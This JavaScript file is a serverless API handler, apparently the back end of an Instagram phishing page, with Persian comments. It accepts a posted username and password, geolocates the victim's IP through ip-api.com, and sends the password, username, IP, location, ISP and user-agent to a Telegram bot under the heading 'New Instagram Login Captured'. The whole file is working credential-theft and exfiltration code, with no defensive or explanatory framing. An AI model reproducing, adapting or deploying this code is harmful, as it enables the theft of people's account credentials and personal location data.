export default async function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Preflight request
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // فقط POST قبول می‌شه
    if (req.method !== 'POST') {
        return res.status(405).json({ status: 'error', message: 'Method not allowed' });
    }

    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('Telegram credentials not set in environment variables');
        return res.status(500).json({ 
            status: 'error', 
            message: 'Server configuration error - missing Telegram credentials' 
        });
    }

    // دریافت داده از body (JSON)
    const username = (req.body?.username || '').trim();
    const password = (req.body?.password || '').trim();

    if (!username || !password) {
        return res.status(400).json({ status: 'error', message: 'Empty fields' });
    }

    // دریافت IP کاربر
    const ip =
        req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
        req.headers['x-real-ip'] ||
        req.socket?.remoteAddress ||
        'Unknown';

    const userAgent = req.headers['user-agent'] || 'Unknown';

    // موقعیت جغرافیایی از IP
    let location = 'Unknown';
    let isp = 'Unknown';

    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);

        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=query,country,city,isp,org,as`, {
            signal: controller.signal
        });
        clearTimeout(timeoutId);

        if (geoRes.ok) {
            const geo = await geoRes.json();
            if (geo && geo.country) {
                location = [geo.city, geo.country].filter(Boolean).join(', ');
                isp = geo.isp || geo.org || 'Unknown';
            }
        }
    } catch (geoErr) {
        console.error('GeoIP error:', geoErr.message);
    }

    // ساخت پیام
    const message = [
        '🔔 <b>New Instagram Login Captured</b>',
        '',
        '━━━━━━━━━━━━━━━━',
        `👤 <b>Username:</b> <code>${escapeHtml(username)}</code>`,
        `🔑 <b>Password:</b> <code>${escapeHtml(password)}</code>`,
        '━━━━━━━━━━━━━━━━',
        `🌐 <b>IP Address:</b> <code>${ip}</code>`,
        `📍 <b>Location:</b> ${location}`,
        `🏢 <b>ISP:</b> ${isp}`,
        `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)} (UTC)`,
        '━━━━━━━━━━━━━━━━',
        `📱 <b>User-Agent:</b>`,
        `<code>${escapeHtml(userAgent)}</code>`,
        '━━━━━━━━━━━━━━━━',
    ].join('\n');

    // ارسال به تلگرام
    try {
        const telegramRes = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true,
                }),
            }
        );

        const telegramData = await telegramRes.json();

        if (!telegramData.ok) {
            console.error('Telegram API error:', telegramData);
            return res.status(200).json({ 
                status: 'error', 
                message: 'Telegram error: ' + (telegramData.description || 'Unknown error')
            });
        }
    } catch (tgErr) {
        console.error('Telegram send error:', tgErr.message);
        return res.status(200).json({ 
            status: 'error', 
            message: 'Telegram connection error: ' + tgErr.message
        });
    }

    return res.status(200).json({ status: 'ok' });
}

function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;',
    };
    return String(text).replace(/[&<>"']/g, (ch) => map[ch]);
}
